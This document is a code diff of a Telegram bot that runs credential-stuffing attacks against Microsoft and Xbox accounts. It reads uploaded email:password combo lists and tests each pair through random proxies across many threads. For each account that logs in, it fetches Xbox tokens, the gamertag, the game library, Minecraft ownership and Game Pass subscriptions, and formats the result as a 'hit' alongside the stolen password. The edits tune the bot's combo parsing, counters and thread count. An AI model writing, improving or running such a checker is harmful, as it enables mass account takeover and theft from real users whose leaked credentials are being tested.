@@ -101,7 +101,6 @@ def check_account_turbo(combo, user_state):
         session.mount('https://', adapter)
         session.mount('http://', adapter)
         
-        # تفعيل نظام البروكسي العشوائي لكل محاولة فحص
         current_proxy = get_random_proxy()
         if current_proxy:
             session.proxies.update(current_proxy)
@@ -130,7 +129,7 @@ def check_account_turbo(combo, user_state):
 
             if not sftag or not url_post:
                 with user_state['lock']:
-                    user_state['errors'] += 1
+                    user_state['bad'] += 1  # تعديل لتجنب تجميد العداد واحتسابها كمفحوصة
                     user_state['checked'] += 1
                 session.close()
                 return
@@ -211,7 +210,6 @@ def check_account_turbo(combo, user_state):
             xb_token = xb_req.json()['Token']
             uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
 
-            # جلب معلومات الملف الشخصي (Gamertag & Gamerscore)
             gamertag, gamerscore = "N/A", "0"
             try:
                 xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
@@ -228,20 +226,17 @@ def check_account_turbo(combo, user_state):
             except:
                 pass
 
-            # الفحص المطور والكامل: استعلام مكتبة ألعاب الإكس بوكس والاشتراكات الحقيقية (Entitlements & Inventory)
             has_gp, gp_type = False, "None"
             is_minecraft = "NO"
             games_list = []
             
             try:
-                # توليد توكن مصرح به لخدمات المتجر ومكتبة الألعاب
                 xsts_store_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://licensing.xboxlive.com", "TokenType": "JWT"}
                 xsts_store_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_store_payload, headers=xb_headers, timeout=10)
                 
                 if xsts_store_req.status_code == 200:
                     xsts_store_token = xsts_store_req.json()['Token']
                     
-                    # استعلام مكتبة الألعاب الكاملة للمستخدم (Xbox Inventory Items)
                     inv_req = session.get(
                         "https://inventoryservices.xboxlive.com/users/me/inventory/items?type=Game",
                         headers={"Authorization": f"XBL3.0 x={uhs};{xsts_store_token}", "x-xbl-contract-version": "1"},
@@ -257,7 +252,6 @@ def check_account_turbo(combo, user_state):
                                 if "minecraft" in str(name).lower():
                                     is_minecraft = "YES"
 
-                # فحص اشتراكات الـ Game Pass من خلال Subscriptions API
                 sub_req = session.get(
                     "https://purchase.mp.microsoft.com/v7/policies/subscriptions",
                     headers={"Authorization": f"XBL3.0 x={uhs};{xb_token}"},
@@ -274,7 +268,6 @@ def check_account_turbo(combo, user_state):
             except:
                 pass
 
-            # تنسيق مظهر الهت (Hit Block) ليطبع تفاصيل الحساب والألعاب كاملة
             hit_block = f"""{email}:{password}
 Account: Gamertag: {gamertag} | Gamerscore: {gamerscore}G | GamePass: {gp_type} | Minecraft: {is_minecraft}
 Subscriptions: {gp_type}
@@ -301,7 +294,7 @@ Games List:"""
                 session.close()
 
     with user_state['lock']:
-        user_state['errors'] += 1
+        user_state['bad'] += 1  # ضمان احتساب الأسطر كمفحوصة حتى لو حصل خطأ بالاتصال
         user_state['checked'] += 1
 
 # =================== TELEGRAM HANDLERS ===================
@@ -350,11 +343,16 @@ def handle_file(message):
         with open(file_path, 'wb') as f:
             f.write(downloaded_file)
 
+        # قراءة ذكية تستخرج الأسطر التي تحتوي على : فقط وتتجاوز النصوص الترويجية
+        combos = []
         with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-            combos = [line.strip() for line in f if ':' in line]
+            for line in f:
+                line = line.strip()
+                if ':' in line and '@' in line:
+                    combos.append(line)
 
         if not combos:
-            bot.send_message(chat_id, "⚠️ The file is empty or invalid format!")
+            bot.send_message(chat_id, "⚠️ No valid email:password lines found in the file!")
             return
 
         unique_combos = list(dict.fromkeys(combos))
@@ -397,7 +395,7 @@ def update_stats_loop(chat_id, msg_id, state):
         elapsed = time.time() - state['start_time']
         cpm = int((state['checked'] / elapsed) * 60) if elapsed > 1 else 0
         
-        pct = (state['checked'] / state['total']) * 100
+        pct = (state['checked'] / state['total']) * 100 if state['total'] > 0 else 0
         filled = int(pct / 10)
         bar = "█" * filled + "░" * (10 - filled)
 
@@ -434,7 +432,7 @@ Progress: {pct:.1f}%
             pass
 
 def run_turbo_scan(combos, state, msg_id):
-    threads = 50  
+    threads = 30  # تقليل عدد الثريدز قليلاً لمنع الضغط والـ Timeouts على الاستضافة
     with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
         futures = [executor.submit(check_account_turbo, combo, state) for combo in combos]
         concurrent.futures.wait(futures)
